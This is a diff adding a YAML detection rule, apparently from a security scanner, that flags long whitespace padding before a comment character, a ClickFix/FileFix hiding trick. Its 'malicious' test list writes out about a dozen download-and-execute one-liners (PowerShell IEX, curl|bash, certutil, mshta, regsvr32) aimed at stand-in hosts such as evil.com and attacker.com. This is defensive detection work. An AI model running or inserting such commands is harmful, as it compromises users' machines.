@@ -1,0 +1,34 @@
+name: medium-62-whitespace-padding-comment
+severity: medium
+description: >
+  Detects excessive whitespace padding before a comment character.
+  FileFix and ClickFix variants use long sequences of spaces to push malicious code off the visible portion of the UI.
+
+pattern: |
+  [\s\u00A0]{10,}#
+
+malicious:
+  - "powershell -c IEX(IWR evil.com/s)          # C:\\Documents\\file.docx"
+  - "curl http://attacker.com/payload.sh | bash                    # Legitimate script"
+  - "cmd /c certutil -urlcache -f http://mal.com/x.exe %temp%\\x.exe               # Update installer"
+  - "wget http://evil.com/malware -O /tmp/mal && chmod +x /tmp/mal && /tmp/mal                      # System maintenance"
+  - "mshta http://attacker.com/payload.hta                         # Help documentation"
+  - "powershell -enc SQBFAFgAKABOAGUAdw==                  # Configuration script"
+  - "bash -c 'curl -s http://evil.com/script.sh | sh'                       # Setup utility"
+  - "python -c \"import urllib;exec(urllib.urlopen('http://mal.com/p').read())\"                    # Python script"
+  - "osascript -e 'do shell script \"curl http://attacker.com/m.sh | bash\"'                        # macOS utility"
+  - "%USERPROFILE%\\Downloads\\payload.exe                     # Document viewer"
+  - "certutil -decode evil.b64 evil.exe && evil.exe                          # Certificate update"
+  - "regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll                             # System registration"
+
+benign:
+  - "echo 'test' # comment"
+  - "ls -la # list files"
+  - "# This is just a comment"
+  - "Get-Process # PowerShell command"
+  - "ping 8.8.8.8 # network test"
+  - "curl example.com # web request"
+  - "python script.py # run script"
+  - "# Configuration file comment"
+  - "// Code comment"
+  - "/* Multi-line comment */"
